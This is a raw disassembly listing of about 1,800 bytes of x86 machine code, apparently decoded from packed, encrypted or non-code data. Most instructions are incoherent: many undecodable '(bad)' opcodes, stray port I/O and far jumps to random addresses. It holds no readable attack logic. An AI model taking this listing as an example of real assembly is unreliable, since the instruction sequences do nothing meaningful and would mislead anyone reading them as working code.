  40b7a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7a6:	imul   ebx,DWORD PTR [edx-0x2e],0xe781a215
  40b7ad:	pop    es
  40b7ae:	shl    DWORD PTR [edi+0x78599c8d],1
  40b7b4:	icebp  
  40b7b5:	xchg   ebp,ebp
  40b7b7:	sub    bl,al
  40b7b9:	push   esp
  40b7ba:	push   edx
  40b7bb:	mov    gs,WORD PTR [esi]
  40b7bd:	loope  0x40b7e2
  40b7bf:	lods   eax,DWORD PTR ds:[esi]
  40b7c0:	shrd   DWORD PTR [ecx+eax*8+0x70],edx,0xe9
  40b7c6:	pop    ecx
  40b7c7:	jge    0x40b821
  40b7c9:	cwd    
  40b7cb:	push   ecx
  40b7cc:	dec    eax
  40b7cd:	cmp    dh,BYTE PTR [ecx+0x53]
  40b7d0:	dec    ecx
  40b7d1:	sub    bh,BYTE PTR [ebp*4-0x23a46de8]
  40b7d8:	call   0x97dfadba
  40b7dd:	mov    esp,0x15dc5021
  40b7e2:	loope  0x40b78c
  40b7e4:	enter  0x41d0,0x7d
  40b7e8:	nop
  40b7e9:	push   eax
  40b7ea:	adc    al,0xc6
  40b7ec:	push   es
  40b7ed:	scas   eax,DWORD PTR es:[edi]
  40b7ee:	gs out dx,eax
  40b7f0:	push   ecx
  40b7f1:	js     0x40b77f
  40b7f3:	mov    WORD PTR [ecx+esi*8],gs
  40b7f6:	test   dl,dl
  40b7f8:	das    
  40b7f9:	(bad)  
  40b7fa:	xor    al,0xff
  40b7fc:	ins    BYTE PTR es:[edi],dx
  40b7fd:	sahf   
  40b7fe:	inc    ebx
  40b7ff:	or     DWORD PTR [esi-0x3066e34b],edx
  40b805:	jo     0x40b79a
  40b807:	jno    0x40b816
  40b809:	js     0x40b80f
  40b80b:	(bad)  
  40b80c:	scas   eax,DWORD PTR es:[edi]
  40b80d:	sbb    al,0xeb
  40b80f:	lahf   
  40b810:	mov    dh,0x3d
  40b812:	jae    0x40b7cd
  40b814:	pop    ds
  40b815:	mov    ecx,0x226388b7
  40b81a:	inc    edx
  40b81b:	mov    ebp,0xde16e640
  40b820:	stc    
  40b821:	iret   
  40b822:	(bad)  
  40b823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b824:	rcl    DWORD PTR [edx+0x37],1
  40b827:	cwde   
  40b828:	cmp    DWORD PTR [edx+0x7b],ecx
  40b82b:	pop    esi
  40b82c:	adc    al,0x3b
  40b82e:	sub    ebp,DWORD PTR [edx-0x245756f8]
  40b834:	jb     0x40b877
  40b836:	mov    ds:0x7c0da43a,eax
  40b83b:	ss in  eax,0xce
  40b83e:	in     eax,0xad
  40b840:	sub    eax,0x8d231ad3
  40b845:	push   eax
  40b846:	loopne 0x40b7e4
  40b848:	or     DWORD PTR [ecx-0x7567a19],ebp
  40b84e:	popf   
  40b84f:	stc    
  40b850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b851:	jbe    0x40b8af
  40b853:	lock (bad) 
  40b856:	pushf  
  40b857:	mov    WORD PTR [eax],fs
  40b859:	xchg   esp,eax
  40b85a:	adc    esi,0x74
  40b85d:	push   cs
  40b85e:	shl    cl,1
  40b860:	push   esp
  40b861:	test   eax,0xd45e830
  40b866:	aas    
  40b867:	aam    0x9c
  40b869:	mov    ah,0x9a
  40b86b:	or     ah,BYTE PTR [eax-0x18]
  40b86e:	mov    ebx,DWORD PTR [esi]
  40b870:	fsub   DWORD PTR [edx-0x24]
  40b873:	jbe    0x40b853
  40b875:	call   0xa91275bf
  40b87a:	daa    
  40b87b:	aas    
  40b87c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b87d:	jno    0x40b8d5
  40b87f:	mov    al,ds:0xe4cc2459
  40b884:	xor    edi,DWORD PTR [edi]
  40b886:	dec    esp
  40b887:	or     ebx,DWORD PTR [edi+0x7d]
  40b88a:	repz adc BYTE PTR [ebp+0x44b34a0],ah
  40b891:	loope  0x40b84b
  40b893:	and    DWORD PTR [ecx+edx*8+0x3e],ebx
  40b897:	xchg   DWORD PTR [ecx],ecx
  40b899:	cmp    eax,0x7ccb6315
  40b89e:	dec    edi
  40b89f:	mov    dh,ah
  40b8a1:	mov    ds:0x157cacce,al
  40b8a6:	addr16 push es
  40b8a8:	inc    edx
  40b8a9:	fcmovnu st,st(7)
  40b8ab:	test   edx,edi
  40b8ad:	test   DWORD PTR [edi+ebx*1],edi
  40b8b0:	xor    eax,0x164f2f96
  40b8b5:	inc    edx
  40b8b6:	cmp    al,0x7
  40b8b8:	mov    cl,0x43
  40b8ba:	pop    esi
  40b8bb:	push   esi
  40b8bc:	xor    BYTE PTR [edx+ebx*8],ah
  40b8bf:	pop    edx
  40b8c0:	sub    DWORD PTR [ebp-0x6b8669c3],edi
  40b8c6:	sub    al,0x98
  40b8c8:	jp     0x40b860
  40b8ca:	pop    ecx
  40b8cb:	ja     0x40b928
  40b8cd:	dec    esp
  40b8ce:	xchg   DWORD PTR [ebp+0x55],esi
  40b8d1:	mov    esp,0xdea1fdc5
  40b8d6:	fisubr WORD PTR [ecx+0x7a]
  40b8d9:	sub    BYTE PTR [ebp+0x7afb0a16],dh
  40b8df:	aam    0x78
  40b8e1:	(bad)  
  40b8e2:	jnp    0x40b875
  40b8e4:	push   ds
  40b8e5:	xchg   edi,eax
  40b8e6:	push   es
  40b8e7:	fwait
  40b8e8:	mov    ebx,0x999a31fa
  40b8ed:	nop
  40b8ee:	mov    al,0x3d
  40b8f0:	inc    ebx
  40b8f1:	adc    al,0x15
  40b8f3:	test   cl,dh
  40b8f5:	jg     0x40b891
  40b8f7:	and    dh,bl
  40b8f9:	adc    DWORD PTR [ecx],0x3d19694d
  40b8ff:	mov    ecx,0xcba115c8
  40b904:	mov    ah,0x5c
  40b906:	es aad 0x4
  40b909:	dec    esp
  40b90a:	dec    ebp
  40b90b:	push   ebx
  40b90c:	outs   dx,BYTE PTR ds:[esi]
  40b90d:	pop    eax
  40b90e:	(bad)  
  40b90f:	ss icebp 
  40b911:	icebp  
  40b912:	sahf   
  40b913:	js     0x40b924
  40b915:	mov    DWORD PTR [ebx-0x32ca3634],esp
  40b91b:	inc    edi
  40b91c:	aaa    
  40b91d:	ror    DWORD PTR [edi+0x49210c0e],0x1
  40b924:	jne    0x40b994
  40b926:	(bad)  
  40b927:	(bad)  
  40b928:	shr    DWORD PTR [ebp+0x681d7ac6],1
  40b92e:	mov    ?,WORD PTR [edi]
  40b930:	add    DWORD PTR [edx],ebx
  40b932:	xchg   esi,eax
  40b933:	mov    ecx,0x4f1e0c89
  40b938:	ja     0x40b97a
  40b93a:	mov    al,ds:0x66a7ffa0
  40b93f:	add    al,0x90
  40b941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b942:	push   ss
  40b943:	cmp    edi,ebp
  40b945:	and    DWORD PTR [esi],ebx
  40b947:	mov    dl,0x30
  40b949:	xor    DWORD PTR [eax+0x4e],eax
  40b94c:	mov    ah,0x2f
  40b94e:	in     eax,dx
  40b94f:	jmp    0x40b904
  40b951:	or     cl,ah
  40b953:	xchg   DWORD PTR [esi-0x72],edx
  40b956:	mov    gs,WORD PTR [edi-0x26795e43]
  40b95c:	xchg   ebp,eax
  40b95d:	mov    ds:0x7d05ee1,al
  40b962:	cmp    al,0x8d
  40b964:	push   es
  40b965:	push   0x45
  40b967:	xchg   eax,ecx
  40b969:	adc    al,0x86
  40b96b:	popf   
  40b96c:	push   esp
  40b96d:	lahf   
  40b96e:	daa    
  40b96f:	jl     0x40b914
  40b971:	dec    ebx
  40b972:	fwait
  40b973:	mov    fs,WORD PTR [eax+0x136ff87e]
  40b979:	loope  0x40b96e
  40b97b:	dec    esp
  40b97c:	or     edi,DWORD PTR [ebp+0x35c4ba6f]
  40b982:	cdq    
  40b983:	add    eax,0x3c42bc2
  40b988:	out    dx,al
  40b989:	dec    ecx
  40b98a:	sub    al,0x20
  40b98c:	adc    dl,0xd2
  40b98f:	rol    DWORD PTR [eax+eiz*2],1
  40b992:	mov    edx,0x6591a01f
  40b997:	ror    DWORD PTR [edi-0x1b],1
  40b99a:	gs push es
  40b99c:	mov    es,WORD PTR [esi+ebp*1]
  40b99f:	stos   DWORD PTR es:[edi],eax
  40b9a0:	cli    
  40b9a1:	fist   DWORD PTR [esi-0x58a6a525]
  40b9a7:	mov    bl,0x3d
  40b9a9:	xchg   DWORD PTR [edi+eax*1],edx
  40b9ac:	sar    edx,0x65
  40b9af:	test   eax,0x17b7e212
  40b9b4:	and    BYTE PTR fs:[eax],ch
  40b9b7:	test   BYTE PTR [edx+0x2dda3422],bl
  40b9bd:	inc    edx
  40b9be:	rol    DWORD PTR [eax],1
  40b9c0:	jmp    0xd1af:0xe68f2907
  40b9c7:	daa    
  40b9c8:	repnz std 
  40b9ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9cb:	inc    ebp
  40b9cc:	repnz int 0xa2
  40b9cf:	aas    
  40b9d0:	pop    esi
  40b9d1:	stc    
  40b9d2:	cs dec edi
  40b9d4:	pop    edx
  40b9d5:	repz xchg ebp,eax
  40b9d7:	fmul   QWORD PTR [ebx+0xd2c83e5]
  40b9dd:	jp     0x40b9da
  40b9df:	push   ecx
  40b9e0:	mov    esi,0xe0865683
  40b9e5:	inc    esi
  40b9e6:	mov    edx,0x1ee65515
  40b9eb:	jl     0x40b9df
  40b9ed:	sti    
  40b9ee:	test   eax,0x86684c13
  40b9f3:	pop    ebx
  40b9f4:	cmp    eax,0xde76a74f
  40b9f9:	fisttp DWORD PTR ds:0x9e739b8b
  40b9ff:	sbb    al,0x7f
  40ba01:	imul   edx,DWORD PTR [ecx+0x47],0xffffffde
  40ba05:	add    BYTE PTR [edi-0x157be92f],bl
  40ba0b:	stos   BYTE PTR es:[edi],al
  40ba0c:	je     0x40ba7b
  40ba0e:	xcrypt-ctr (bad)
  40ba0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba10:	pop    esi
  40ba11:	push   ebp
  40ba12:	mov    al,0x8c
  40ba14:	add    eax,0x1f56d36f
  40ba19:	inc    esp
  40ba1a:	mov    edi,ecx
  40ba1c:	jb     0x40ba81
  40ba1e:	dec    ebx
  40ba1f:	pop    esp
  40ba20:	test   edx,eax
  40ba22:	and    al,0xf9
  40ba24:	adc    ah,al
  40ba26:	sbb    al,0x91
  40ba28:	mov    bh,0x98
  40ba2a:	sbb    esi,DWORD PTR [ecx]
  40ba2c:	jecxz  0x40ba9e
  40ba2e:	das    
  40ba2f:	ja     0x40ba73
  40ba31:	or     DWORD PTR [edx-0xc],0xe358d923
  40ba38:	inc    ebp
  40ba39:	xchg   ebx,eax
  40ba3a:	cmpxchg esp,edi
  40ba3d:	push   esi
  40ba3e:	jns    0x40b9d7
  40ba40:	and    DWORD PTR [edx+0x5d4280c9],esi
  40ba46:	pop    ebx
  40ba47:	bnd js 0x40ba08
  40ba4a:	pop    edx
  40ba4b:	mov    DWORD PTR [eax],edx
  40ba4d:	jae    0x40ba93
  40ba4f:	ja     0x40ba45
  40ba51:	mov    al,ds:0xe97d7d0c
  40ba56:	xchg   ebp,eax
  40ba57:	test   al,0x84
  40ba59:	fild   QWORD PTR [esi+0x5b]
  40ba5c:	jp     0x40ba27
  40ba5e:	outs   dx,BYTE PTR ds:[esi]
  40ba5f:	je     0x40baab
  40ba61:	sahf   
  40ba62:	pop    eax
  40ba63:	ret    
  40ba64:	dec    ecx
  40ba65:	clc    
  40ba66:	jg     0x40ba9d
  40ba68:	(bad)
  40ba6c:	and    edi,DWORD PTR [ebx-0x8]
  40ba6f:	shr    DWORD PTR [eax+0x40da5e7b],0x5a
  40ba76:	xchg   BYTE PTR [edi-0x35],ch
  40ba79:	pop    ebp
  40ba7a:	or     ebx,DWORD PTR [ebx-0x7c]
  40ba7d:	in     eax,dx
  40ba7e:	add    esi,esp
  40ba80:	adc    eax,0xea30b620
  40ba85:	hlt    
  40ba86:	jmp    0x40ba2f
  40ba88:	inc    edi
  40ba89:	test   eax,0x741876d8
  40ba8e:	pop    es
  40ba8f:	iret   
  40ba90:	aad    0x59
  40ba92:	les    eax,FWORD PTR [edi]
  40ba94:	cmp    edi,DWORD PTR [ebp-0x2b]
  40ba97:	fdivr  st(5),st
  40ba99:	in     al,dx
  40ba9a:	push   0xdc4416ce
  40ba9f:	lds    ecx,FWORD PTR [ecx+0x17c1ab6e]
  40baa5:	mov    edx,0x7674d54f
  40baaa:	mov    dh,0x28
  40baac:	xchg   BYTE PTR [edi+0x78],dl
  40baaf:	ja     0x40bafb
  40bab1:	call   0x3476:0xaa849ce2
  40bab8:	or     eax,0xda77fb8
  40babd:	int3   
  40babe:	lock icebp 
  40bac0:	mov    ebx,0x3689479d
  40bac5:	stc    
  40bac6:	pusha  
  40bac7:	bound  ebx,QWORD PTR [ebp-0x2b]
  40baca:	out    dx,eax
  40bacb:	je     0x40bb2e
  40bacd:	xor    DWORD PTR [edx],esp
  40bacf:	xchg   edi,eax
  40bad0:	out    0x8e,eax
  40bad2:	inc    edx
  40bad3:	mov    ah,0xa0
  40bad5:	xchg   edi,eax
  40bad6:	sub    BYTE PTR ds:0x5404056c,ch
  40badc:	mov    ds,edx
  40bade:	fdiv   DWORD PTR [ebx+0x4baf446a]
  40bae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bae5:	ret    
  40bae6:	sub    esi,eax
  40bae8:	mov    ah,0xe8
  40baea:	xchg   ebp,edx
  40baec:	mov    ch,0x92
  40baee:	cmp    ch,bh
  40baf0:	stos   DWORD PTR es:[edi],eax
  40baf1:	test   eax,0x2716bd1d
  40baf6:	gs ja  0x40bb64
  40baf9:	push   ecx
  40bafa:	push   ebp
  40bafb:	sub    edx,eax
  40bafd:	add    bh,BYTE PTR [ecx+0x3ad6c39a]
  40bb03:	dec    ecx
  40bb04:	fidivr DWORD PTR [esi-0x24]
  40bb07:	dec    edx
  40bb08:	adc    al,0x83
  40bb0a:	xor    BYTE PTR ds:0x2863d3c4,0xab
  40bb11:	aas    
  40bb12:	add    ebx,DWORD PTR [edi]
  40bb14:	je     0x40baeb
  40bb16:	shl    ch,cl
  40bb18:	cs inc esp
  40bb1a:	mov    edi,0x8d7aaa6b
  40bb1f:	cdq    
  40bb20:	mov    ds:0x643d4629,al
  40bb25:	adc    al,0xcf
  40bb27:	(bad)  
  40bb28:	dec    ebx
  40bb29:	and    edi,DWORD PTR [edx]
  40bb2b:	pop    esi
  40bb2c:	pushf  
  40bb2d:	fsubr  QWORD PTR [ebx-0x5b0fd376]
  40bb33:	push   eax
  40bb34:	add    al,0xbe
  40bb36:	xchg   esi,eax
  40bb37:	les    edx,FWORD PTR [esp+edi*4-0x766b4562]
  40bb3e:	dec    edi
  40bb3f:	ror    BYTE PTR [ebp-0x4e],1
  40bb42:	jb     0x40bb85
  40bb44:	and    ch,BYTE PTR [eax]
  40bb46:	mov    cl,0x2
  40bb48:	mov    ds:0x4c4b9e62,al
  40bb4d:	push   ecx
  40bb4e:	pop    ecx
  40bb4f:	mov    WORD PTR [edx+0x4f],cs
  40bb52:	cdq    
  40bb53:	outs   dx,BYTE PTR ds:[esi]
  40bb54:	cmp    al,BYTE PTR [ebx+0x3]
  40bb57:	in     al,0x4a
  40bb59:	pop    ss
  40bb5a:	fmul   st(0),st
  40bb5c:	std    
  40bb5d:	dec    ebp
  40bb5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb5f:	sbb    DWORD PTR [ebx+0x7b],ebp
  40bb62:	imul   esi,DWORD PTR ds:0x906a884f,0xffffff88
  40bb69:	lds    eax,FWORD PTR [ebx+0xd]
  40bb6c:	mov    ch,0x60
  40bb6e:	mov    WORD PTR [ecx+ebx*4],?
  40bb71:	jbe    0x40bbdd
  40bb73:	mov    BYTE PTR [ebx],ch
  40bb75:	pop    eax
  40bb76:	push   cs
  40bb77:	cmp    BYTE PTR [esi+0x79],cl
  40bb7a:	aaa    
  40bb7b:	sub    esp,DWORD PTR [ebx+0x2b]
  40bb7e:	into   
  40bb7f:	xchg   edx,eax
  40bb80:	lock xor BYTE PTR [edi],cl
  40bb83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb84:	lods   al,BYTE PTR ds:[esi]
  40bb85:	mov    dl,0x9
  40bb87:	(bad)
  40bb8a:	sub    DWORD PTR [edi-0x5e],0xf12d6f27
  40bb91:	xchg   DWORD PTR [esi+0x22a3106f],edx
  40bb97:	sub    al,0xe9
  40bb99:	out    0x5,eax
  40bb9b:	cmc    
  40bb9c:	pop    ebp
  40bb9d:	cmp    DWORD PTR ss:[ecx],0xac967efd
  40bba4:	(bad)  
  40bba5:	retf   
  40bba6:	inc    edi
  40bba7:	add    DWORD PTR [ebp-0x56c6727c],ebp
  40bbad:	(bad)  
  40bbae:	and    eax,0x41d78801
  40bbb3:	jbe    0x40bbab
  40bbb5:	(bad)  
  40bbb6:	jns    0x40bb79
  40bbb8:	dec    esp
  40bbb9:	jne    0x40bb62
  40bbbb:	jb     0x40bb82
  40bbbd:	xlat   BYTE PTR ds:[ebx]
  40bbbe:	jo     0x40bc19
  40bbc0:	mov    ch,BYTE PTR ds:0x94ef8e08
  40bbc6:	mov    bh,0x28
  40bbc8:	push   ecx
  40bbc9:	shl    DWORD PTR [edi-0x7d],1
  40bbcc:	sar    BYTE PTR [esi],1
  40bbce:	test   BYTE PTR [ebx+0x54],bl
  40bbd1:	xor    BYTE PTR [esi],ch
  40bbd3:	jmp    DWORD PTR [edx-0x27]
  40bbd6:	nop
  40bbd7:	icebp  
  40bbd8:	ss push esp
  40bbda:	repnz aas 
  40bbdc:	dec    ecx
  40bbdd:	sbb    BYTE PTR [esi+0x75ff9fb1],cl
  40bbe3:	sar    DWORD PTR [ecx-0x77582924],0xe6
  40bbea:	pusha  
  40bbeb:	and    eax,0x8973aeac
  40bbf0:	mov    ah,BYTE PTR [ecx-0x6a63053c]
  40bbf6:	dec    ecx
  40bbf7:	call   0x72530109
  40bbfc:	pop    esi
  40bbfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbfe:	(bad)  
  40bbff:	adc    ah,ah
  40bc01:	fcmove st,st(5)
  40bc03:	add    eax,0x89b467d0
  40bc08:	sub    edx,DWORD PTR [eax]
  40bc0a:	lds    eax,FWORD PTR [ebp-0x52971b4f]
  40bc10:	scas   eax,DWORD PTR es:[edi]
  40bc11:	xchg   esp,eax
  40bc12:	in     eax,0x52
  40bc14:	pop    ebp
  40bc15:	and    cl,BYTE PTR [ecx-0x72]
  40bc18:	out    dx,al
  40bc19:	lods   al,BYTE PTR ds:[esi]
  40bc1a:	dec    esi
  40bc1b:	xchg   esi,eax
  40bc1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc1d:	ins    DWORD PTR es:[edi],dx
  40bc1e:	push   ebx
  40bc1f:	or     al,0x7d
  40bc21:	imul   ecx,DWORD PTR [eax],0x1b6b7051
  40bc27:	xlat   BYTE PTR ds:[ebx]
  40bc28:	mov    BYTE PTR [esp+ebp*4],dl
  40bc2b:	mov    eax,0x3a783b9f
  40bc30:	out    dx,eax
  40bc31:	lea    ecx,[eax]
  40bc33:	call   DWORD PTR [ebx-0x6af3e966]
  40bc39:	pop    es
  40bc3a:	cs ja  0x40bc38
  40bc3d:	mov    bh,0x7d
  40bc3f:	test   eax,0xde1addb7
  40bc44:	icebp  
  40bc45:	jb     0x40bc6b
  40bc47:	pop    ds
  40bc48:	jl     0x40bc05
  40bc4a:	push   0x6638cc4a
  40bc4f:	lods   al,BYTE PTR ds:[esi]
  40bc50:	stos   DWORD PTR es:[edi],eax
  40bc51:	sahf   
  40bc52:	iret   
  40bc53:	and    DWORD PTR [ecx-0xac1daa2],0xffffffc7
  40bc5a:	std    
  40bc5b:	shl    bl,1
  40bc5d:	arpl   WORD PTR [edi],sp
  40bc5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc60:	and    bl,cl
  40bc62:	test   dh,al
  40bc64:	pushf  
  40bc65:	xor    al,0xa6
  40bc67:	lea    edi,[ecx]
  40bc69:	xchg   cl,dl
  40bc6b:	xor    eax,0x500276c1
  40bc70:	outs   dx,BYTE PTR ds:[esi]
  40bc71:	sbb    edi,esi
  40bc73:	ret    
  40bc74:	xlat   BYTE PTR ds:[ebx]
  40bc75:	push   0x85cff2af
  40bc7a:	ds cdq 
  40bc7c:	push   ss
  40bc7d:	xchg   ecx,eax
  40bc7e:	in     eax,0x49
  40bc80:	pop    eax
  40bc81:	mov    eax,0xc9f3192f
  40bc86:	icebp  
  40bc87:	aaa    
  40bc88:	jge    0x40bc3f
  40bc8a:	inc    esi
  40bc8b:	into   
  40bc8c:	xchg   bl,dh
  40bc8e:	cmp    esp,DWORD PTR [edi-0x2b5b3f3]
  40bc94:	icebp  
  40bc95:	mov    BYTE PTR [eax+0x6ac2aab4],dh
  40bc9b:	inc    esp
  40bc9c:	mov    al,0x9
  40bc9e:	out    0x8c,al
  40bca0:	dec    ebx
  40bca1:	cmp    dh,al
  40bca3:	sub    eax,0x999e75ae
  40bca8:	mov    dh,0x6
  40bcaa:	pop    edx
  40bcab:	adc    ah,BYTE PTR [ecx]
  40bcad:	dec    edi
  40bcae:	stc    
  40bcaf:	or     al,0x52
  40bcb1:	and    esp,DWORD PTR [eax+esi*4]
  40bcb4:	pop    esi
  40bcb5:	inc    BYTE PTR [ebx+ecx*2+0x6e]
  40bcb9:	add    eax,0x57c50f3c
  40bcbe:	pop    edi
  40bcbf:	sub    DWORD PTR [edi+0x745016b7],0xf30e5858
  40bcc9:	jmp    0x9788bde5
  40bcce:	fscale 
  40bcd0:	repnz mov edi,0xde009e73
  40bcd6:	mov    BYTE PTR [ecx+0x323629ab],bl
  40bcdc:	rcl    DWORD PTR [edi+0x2cd07255],0x43
  40bce3:	pop    ss
  40bce4:	rcr    DWORD PTR [ebx],0xa8
  40bce7:	loopne 0x40bd00
  40bce9:	jbe    0x40bd2e
  40bceb:	mov    ss:0x11c0baf9,al
  40bcf1:	scas   al,BYTE PTR es:[edi]
  40bcf2:	push   eax
  40bcf3:	mov    eax,ds:0xd47f729b
  40bcf8:	out    0x3d,eax
  40bcfa:	xor    DWORD PTR [ebx+0x62],ecx
  40bcfd:	in     eax,dx
  40bcfe:	dec    ecx
  40bcff:	and    edx,DWORD PTR [eax]
  40bd01:	cmovg  ebx,DWORD PTR [ebp+0x3a8ab6d7]
  40bd08:	push   ds
  40bd09:	add    al,0xe6
  40bd0b:	push   esi
  40bd0c:	dec    esi
  40bd0d:	int    0xb7
  40bd0f:	in     al,dx
  40bd10:	nop
  40bd11:	xchg   ecx,ebp
  40bd13:	or     BYTE PTR [ebx+0x3a48ed94],ch
  40bd19:	ds fs mov dh,0x55
  40bd1d:	aam    0x7d
  40bd1f:	fidiv  WORD PTR [edi]
  40bd21:	cmp    BYTE PTR [edi+eiz*1+0x54],cl
  40bd25:	mov    esi,0x4776dbaa
  40bd2a:	aam    0x9f
  40bd2c:	fwait
  40bd2d:	xor    eax,DWORD PTR [edx]
  40bd2f:	cwde   
  40bd30:	aam    0xa6
  40bd32:	pop    ss
  40bd33:	dec    ecx
  40bd34:	sbb    ecx,ecx
  40bd36:	jecxz  0x40bd16
  40bd38:	push   es
  40bd39:	push   edx
  40bd3a:	cli    
  40bd3b:	fld    DWORD PTR [edx]
  40bd3d:	inc    eax
  40bd3e:	mov    ds:0xd7e04ac4,al
  40bd43:	ficom  WORD PTR [edx+0xc]
  40bd46:	sub    eax,ebp
  40bd48:	repz jl 0x40bcda
  40bd4b:	inc    esi
  40bd4c:	sbb    eax,0x1c18a751
  40bd51:	out    dx,al
  40bd52:	jbe    0x40bd5e
  40bd54:	loop   0x40bd6c
  40bd56:	cmp    BYTE PTR [edx+0x4e],0x4f
  40bd5a:	mov    al,ds:0xd8043a35
  40bd5f:	sub    al,0xeb
  40bd61:	inc    edx
  40bd62:	mov    ah,0xac
  40bd64:	sbb    ebp,ecx
  40bd66:	ss push ecx
  40bd68:	or     BYTE PTR [ecx-0x1e23a31b],0x57
  40bd6f:	adc    WORD PTR [ecx-0x8],0x3b5a
  40bd75:	jg     0x40bd97
  40bd77:	and    BYTE PTR [edx-0x3ff2d34b],cl
  40bd7d:	push   esp
  40bd7e:	ficomp WORD PTR [esi+0x4954c0b9]
  40bd84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd85:	jge    0x40bd0c
  40bd87:	mov    edi,0x4faf90a2
  40bd8c:	add    eax,0xa871fd66
  40bd91:	leave  
  40bd92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd93:	mov    bh,BYTE PTR [ebx-0x76a5fa9f]
  40bd99:	cmp    al,0x0
  40bd9b:	jae    0x40bd36
  40bd9d:	and    ebp,DWORD PTR [edi]
  40bd9f:	cs stc 
  40bda1:	jp     0x40bd44
  40bda3:	and    ch,BYTE PTR ss:[edi+ebp*8+0x75]
  40bda8:	div    BYTE PTR [edx+0x7fc36641]
  40bdae:	xor    dl,BYTE PTR [ebx]
  40bdb0:	xor    esp,DWORD PTR [edi+edi*1+0x75]
  40bdb4:	mov    ah,0xfe
  40bdb6:	mov    WORD PTR [esi-0x31],?
  40bdb9:	in     al,0x64
  40bdbb:	daa    
  40bdbc:	pop    ss
  40bdbd:	(bad)  
  40bdbe:	pop    edx
  40bdbf:	pushf  
  40bdc0:	and    cl,dh
  40bdc2:	mov    dh,0x7a
  40bdc4:	xchg   ebp,eax
  40bdc5:	pop    ss
  40bdc6:	int3   
  40bdc7:	lahf   
  40bdc8:	ss sub al,0xa0
  40bdcb:	pop    ss
  40bdcc:	test   DWORD PTR [ebx+0x7a],0xb99052f3
  40bdd3:	cwde   
  40bdd4:	sbb    DWORD PTR [ebx+0x15a3dfb],ebx
  40bdda:	or     eax,0xb63760e8
  40bddf:	rcl    ebx,0xf
  40bde2:	sar    eax,1
  40bde4:	repz mov dh,0xed
  40bde7:	pop    ecx
  40bde8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bde9:	sbb    al,BYTE PTR ds:0x95cc05dd
  40bdef:	fwait
  40bdf0:	imul   esp,esi,0x86513ec9
  40bdf6:	lods   al,BYTE PTR ds:[esi]
  40bdf7:	add    edi,edi
  40bdf9:	(bad)  
  40bdfa:	(bad)  [ebx-0x69e0a28]
  40be00:	xor    DWORD PTR [ecx],edx
  40be02:	lods   eax,DWORD PTR ds:[esi]
  40be03:	push   0xa35298b3
  40be08:	(bad)  
  40be0b:	mov    ebp,0xe779e771
  40be10:	in     eax,0xab
  40be12:	inc    ebp
  40be13:	xor    al,0xc5
  40be15:	rcr    DWORD PTR [edx],1
  40be17:	xchg   esp,eax
  40be18:	mov    al,0x26
  40be1a:	fisttp WORD PTR [edi-0xd]
  40be1d:	and    edi,DWORD PTR [edi]
  40be1f:	add    ch,BYTE PTR [ebx-0x23]
  40be22:	imul   edx,DWORD PTR [ebp+0x4a644eef],0x6c715beb
  40be2c:	nop
  40be2d:	sub    al,cl
  40be2f:	and    edi,DWORD PTR [eax-0x34]
  40be32:	adc    eax,0xa7741681
  40be37:	dec    esp
  40be38:	pop    edx
  40be39:	sar    BYTE PTR [ebx+0x2bb1a380],cl
  40be3f:	mov    dh,0x84
  40be41:	data16 jmp 0x40be95
  40be44:	scas   al,BYTE PTR es:[edi]
  40be45:	fst    QWORD PTR [ebp-0x22dd43e4]
  40be4b:	(bad)  
  40be4c:	jmp    0x38f9:0x195f4792
  40be53:	clc    
  40be54:	adc    esp,DWORD PTR [esp+ecx*8-0x1a]
  40be58:	mov    bl,0xc1
  40be5a:	shl    al,cl
  40be5c:	mov    ecx,eax
  40be5e:	pop    DWORD PTR [ebp+0x2]
  40be61:	push   es
  40be62:	ins    DWORD PTR es:[di],dx
  40be64:	hlt    
  40be65:	loopne 0x40bed2
  40be67:	push   edi
  40be68:	mov    bh,0x25
  40be6a:	and    al,0xbf
  40be6c:	pop    ebp
  40be6d:	cmp    al,0xaa
  40be6f:	push   ss
  40be70:	(bad)  
  40be71:	cmp    al,0x4d
  40be73:	ret    
  40be74:	cmp    al,0x33
  40be76:	or     bl,BYTE PTR [edi]
  40be78:	jo     0x40bec8
  40be7a:	into   
  40be7b:	rdtsc  
  40be7d:	nop
  40be7e:	pop    ss
  40be7f:	mov    ecx,0x33b757c4
  40be84:	(bad)  
  40be85:	adc    ch,cl
  40be87:	out    0x53,eax
  40be89:	jbe    0x40beb9
  40be8b:	xor    DWORD PTR [ebx-0x17],esp
  40be8e:	xor    DWORD PTR [ebp+edi*1+0x19],esi
  40be92:	test   al,0x74
  40be94:	leave  
  40be95:	push   ds
  40be96:	aas    
  40be97:	(bad)  [esi]
  40be99:	in     eax,dx
  40be9a:	pop    ds
  40be9b:	add    DWORD PTR [edi],ebx
  40be9d:	xchg   ebx,eax
  40be9e:	subps  xmm5,XMMWORD PTR [ecx-0x58a0ebb4]
  40bea5:	adc    bl,BYTE PTR [ebp+0xc86f0b3]
  40beab:	in     al,dx
  40beac:	sahf   
  40bead:	inc    esi
  40beae:	dec    ebp
  40beaf:	dec    edx
  40beb0:	stos   DWORD PTR es:[edi],eax
  40beb1:	(bad)  
  40beb2:	rcr    edi,1
  40beb4:	jmp    0x40bf2e
  40beb6:	fwait
  40beb7:	dec    ebx
  40beb8:	mov    al,0xdd
  40beba:	in     al,dx
  40bebb:	ret    0x41ff
  40bebe:	push   es
  40bebf:	dec    ecx
  40bec0:	xchg   ebx,eax
  40bec1:	(bad)  
  40bec2:	icebp  
  40bec3:	xchg   ebp,eax
  40bec4:	xor    eax,0x96e915a2
  40bec9:	push   ds
